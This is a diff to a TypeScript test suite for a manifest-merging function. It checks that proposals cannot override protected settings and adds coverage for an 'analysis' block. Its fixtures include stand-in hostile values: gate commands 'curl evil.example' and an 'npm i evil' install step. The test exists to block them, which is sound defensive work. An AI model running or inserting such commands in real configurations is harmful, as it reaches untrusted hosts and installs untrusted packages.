@@ -37,6 +37,7 @@ describe('applyManifestProposal', () => {
       defaultModel: 'evil',
       processes: { review: { provider: 'claude', model: 'm' } },
       uat: { gates: [{ name: 'evil', kind: 'command', command: 'curl evil.example' }] } as Manifest['uat'],
+      analysis: { codePointers: true },
       review: { gates: [{ name: 'evil', kind: 'command', command: 'curl evil.example' }] } as Manifest['review'],
       approaches: [{ id: 'a', label: 'a', source: { type: 'npm', package: 'evil', command: 'npm i evil', collect: [] } }],
     });
@@ -46,12 +47,45 @@ describe('applyManifestProposal', () => {
     expect(applied.defaultModel).toBeUndefined();
     expect(applied.processes).toBeUndefined();
     expect(applied.uat).toBeUndefined();
+    expect(applied.analysis).toBeUndefined();
     expect(applied.review).toBeUndefined();
     expect(applied.approaches).toBeUndefined();
     expect(applied.host).toBe('127.0.0.1');
     expect(applied.portRange).toEqual([4000, 4100]);
     expect(applied.baselineBranch).toBe('develop');
     expect(Object.keys(applied.repositories)).toEqual(['web']);
+  });
+
+  it('protects the analysis block from being dropped or flipped by a proposal', () => {
+    // Case 1: Proposal omits analysis -> restored from current
+    const currentWithAnalysis = manifest({
+      repositories: { web: repo('/w/web') },
+      analysis: { codePointers: true },
+    });
+    const proposedWithoutAnalysis = manifest({
+      repositories: { web: repo('/w/web', { service: service('npm run dev') }) },
+    });
+    const appliedRestored = applyManifestProposal(currentWithAnalysis, proposedWithoutAnalysis);
+    expect(appliedRestored.analysis).toEqual({ codePointers: true });
+
+    // Case 2: Proposal attempts to change/flip analysis -> proposal value is ignored
+    const currentWithoutAnalysis = manifest({
+      repositories: { web: repo('/w/web') },
+    });
+    const proposedWithAnalysis = manifest({
+      repositories: { web: repo('/w/web') },
+      analysis: { codePointers: true },
+    });
+    const appliedIgnored = applyManifestProposal(currentWithoutAnalysis, proposedWithAnalysis);
+    expect(appliedIgnored.analysis).toBeUndefined();
+
+    // Proposal attempts to flip codePointers from true to false -> ignored
+    const proposedFlip = manifest({
+      repositories: { web: repo('/w/web') },
+      analysis: { codePointers: false },
+    });
+    const appliedFlipped = applyManifestProposal(currentWithAnalysis, proposedFlip);
+    expect(appliedFlipped.analysis).toEqual({ codePointers: true });
   });
 
   it('keeps identity, presets and processes from the current manifest', () => {
